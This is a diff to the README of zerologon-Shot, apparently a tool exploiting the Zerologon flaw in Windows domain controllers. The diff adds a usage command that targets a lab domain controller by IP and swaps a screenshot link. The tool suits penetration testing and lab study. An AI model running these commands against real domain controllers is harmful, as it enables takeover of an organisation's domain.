@@ -45,6 +45,7 @@ python3 zerologon-Shot.py domain/'dc_name$'@ip_addr
 E.g.
 
 python3 zerologon-Shot.py xiaoli-2008.com/'WIN-D6SJTQG7I0K$'@192.168.85.210
+python3 zerologon-Shot.py xiaoli-2008.com/'WIN-D6SJTQG7I0K$'@192.168.85.210 -target-ip 192.168.85.210
 ```
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
@@ -52,7 +53,7 @@ python3 zerologon-Shot.py xiaoli-2008.com/'WIN-D6SJTQG7I0K$'@192.168.85.210
 - #### _Enter to win!!!_
 ![image](https://github.com/XiaoliChan/zerologon-Shot/assets/30458572/816959b8-0e09-4d95-a6d4-b9c2e38d418a)
 
-![image](https://github.com/XiaoliChan/zerologon-Shot/assets/30458572/8ddfa503-6035-4c4d-8feb-8fae113b574c)
+![image](https://github.com/XiaoliChan/zerologon-Shot/assets/30458572/bd957328-f09b-482d-a4fc-61ae94daab3a)
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
